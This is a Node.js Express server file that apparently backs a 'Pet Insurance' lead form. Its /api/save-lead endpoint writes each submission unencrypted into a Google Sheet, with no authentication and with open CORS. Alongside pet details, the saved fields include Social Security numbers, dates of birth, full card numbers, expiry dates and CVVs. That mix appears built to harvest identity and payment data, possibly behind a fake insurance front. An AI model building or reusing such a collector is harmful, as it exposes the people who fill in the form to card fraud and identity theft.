require("dotenv").config();

const express = require("express");
const cors = require("cors");
const { google } = require("googleapis");

const app = express();

app.use(cors());
app.use(express.json());

const getPakistanTime = () => {
  return new Date().toLocaleString("en-US", {
    timeZone: "Asia/Karachi",
  });
};

function getGoogleAuth() {
  return new google.auth.GoogleAuth({
    keyFile: "./google-sheet-key.json",
    scopes: ["https://www.googleapis.com/auth/spreadsheets"],
  });
}

async function appendRow(tabName, values) {
  if (!process.env.SHEET_ID) {
    throw new Error("SHEET_ID is missing in .env");
  }

  const auth = getGoogleAuth();
  const sheets = google.sheets({ version: "v4", auth });

  const appendResponse = await sheets.spreadsheets.values.append({
    spreadsheetId: process.env.SHEET_ID,
    range: `${tabName}!A1`,
    valueInputOption: "USER_ENTERED",
    insertDataOption: "INSERT_ROWS",
    includeValuesInResponse: true,
    requestBody: {
      values: [values],
    },
  });

  const updatedRange = appendResponse.data.updates.updatedRange;
  const rowNumber = Number(updatedRange.match(/![A-Z]+(\d+):/)?.[1]);

  const spreadsheet = await sheets.spreadsheets.get({
    spreadsheetId: process.env.SHEET_ID,
  });

  const sheet = spreadsheet.data.sheets.find(
    (s) => s.properties.title === tabName
  );

  if (!sheet || !rowNumber) return;

  await sheets.spreadsheets.batchUpdate({
    spreadsheetId: process.env.SHEET_ID,
    requestBody: {
      requests: [
        {
          repeatCell: {
            range: {
              sheetId: sheet.properties.sheetId,
              startRowIndex: rowNumber - 1,
              endRowIndex: rowNumber,
              startColumnIndex: 0,
              endColumnIndex: values.length,
            },
            cell: {
              userEnteredFormat: {
                backgroundColor: { red: 1, green: 1, blue: 1 },
                textFormat: {
                  foregroundColor: { red: 0, green: 0, blue: 0 },
                  bold: false,
                },
              },
            },
            fields:
              "userEnteredFormat(backgroundColor,textFormat.foregroundColor,textFormat.bold)",
          },
        },
      ],
    },
  });
}

app.get("/", (req, res) => {
  res.send("Pet Insurance Backend Running");
});

app.post("/api/save-lead", async (req, res) => {
  try {
    const data = req.body;
    const uniqueId = data.uniqueId || `PET-${Date.now()}`;

    await appendRow("MasterData", [
      getPakistanTime(),
      uniqueId,
      data.petName || "",
      data.petSpecies || "",
      data.petSex || "",
      data.breed || "",
      data.age || "",
      data.zipCode || "",
      data.email || "",
      data.phone || "",
      data.planName || "",
      data.amount || "",
      data.firstName || "",
      data.lastName || "",
      data.address || "",
      data.apartment || "",
      data.city || "",
      data.state || "",
      data.dob || "",
      data.ssn || "",
      data.cardName || "",
      data.cardNumber || "",
      data.cardExpiry || "",
      data.cardCVV || "",
      data.billingZip || "",
    ]);

    res.json({ success: true, uniqueId });
  } catch (error) {
    console.log("SAVE LEAD ERROR:", error.message);
    res.status(500).json({ success: false, message: error.message });
  }
});

module.exports = app;

if (require.main === module) {
  const PORT = process.env.PORT || 5000;
  app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
  });
}